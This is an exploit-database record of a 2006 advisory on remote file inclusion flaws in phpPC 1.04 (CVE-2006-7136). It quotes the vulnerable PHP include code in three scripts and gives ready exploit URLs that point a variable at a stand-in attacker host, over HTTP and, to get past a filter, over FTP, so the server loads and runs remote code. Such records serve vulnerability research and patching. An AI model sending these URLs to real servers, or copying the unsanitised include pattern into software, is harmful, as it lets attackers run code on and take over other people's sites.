{
  "id": "2827",
  "title": "phpPC 1.04 - Multiple Remote File Inclusions",
  "cve": "CVE-2006-7136",
  "vuln_type": "unknown",
  "code": "phpPC 1.04 Multiples Remote File Inclusion\r\n\r\nScript        : PHP Poll Creator\r\nVersion       : 1.04\r\nVendor URL    : http://www.phppc.de\r\nImpact        : Remote File Inclusion\r\nDiscovered by : iss4m\r\nContact       : iss4m.1@gmail.com\r\n\r\n\r\nVulnerable code in poll.php\r\n--------------------------------\r\n\r\n<?php\r\nif ($is_phppc_included != 1) {\r\n    include \"config.inc.php\";\r\n    $file = \"lib/functions.inc.php\";\r\n    include $relativer_pfad.$file;\r\n    include ($relativer_pfad . \"layout_top.inc.php\");\r\n    $is_phppc_included = 1;\r\n}else include $relativer_pfad . \"lib/get_config.inc.php\"; #<== !!!!\r\n\r\nExploit :\r\n**********\r\n\r\nhttp://localhost/phppc/poll.php?is_phppc_included=1&relativer_pfad=http://attacker/inject.txt?\r\n\r\n\r\nVulnerable code in poll.php poll_kommentar.php\r\n-----------------------------------------------\r\n\r\n<?php\r\n\r\nif ($is_phppc_included != 1) {\r\n    include \"config.inc.php\";\r\n    include ($relativer_pfad . \"lib/functions.inc.php\");\r\n}\r\n$com = \"phppc_kommentar\";\r\n$cookie = $cookie_name.$com.$poll_id;\r\n$cookie_ueberwachung = ${$cookie};\r\nif($action=='new_com') {\r\n    if ($cookie_ueberwachung==\"flood\") {\r\n        $must_not_create_com = 1;\r\n    }else {\r\n        $zeit = time() + 30;\r\n        SetCookie(\"$cookie_name$com$poll_id\",\"flood\",\"$zeit\",\"/\");        \r\n    }\r\n}\r\nif ($is_phppc_included != 1) {\r\n    include \"layout_top.inc.php\";\r\n    $is_phppc_included = 1;\r\n}\r\ninclude $relativer_pfad . \"poll_titel_kat.inc.php\";  # Here !!!!!!!!\r\n\r\n\r\nhttp://localhost/phppc/poll_kommentar.php?is_phppc_included=1&relativer_pfad=http://attacker/inject.txt ?\r\n\r\n\r\n\r\nVulnerable code in poll_sm.php\r\n---------------------------------\r\n\r\nif(substr_count($relativer_pfad,\"http://\") >= 1 OR substr_count($relativer_pfad,\"../\") >= 1) $relativer_pfad = \"\";\r\n\r\nif ($is_phppc_included != 1) {\r\n    $file = \"lib/functions.inc.php\";\r\n    include $relativer_pfad.$file;\r\n}\r\ninclude ($relativer_pfad . \"layout_top_sm.inc.php\");\r\n\r\n\r\nthe script check only if $relativer_pfad contain \"http://\" but we can include remote file using ftp://\r\n\r\nExploit :\r\n**********\r\n\r\nhttp://localhost/phppc/poll_sm.php?is_phppc_included=1&relativer_pfad=ftp://user:pass@ftp.attacker.ltd/script.txt ?\r\n\r\n# milw0rm.com [2006-11-21]",
  "url": "https://www.exploit-db.com/exploits/2827"
}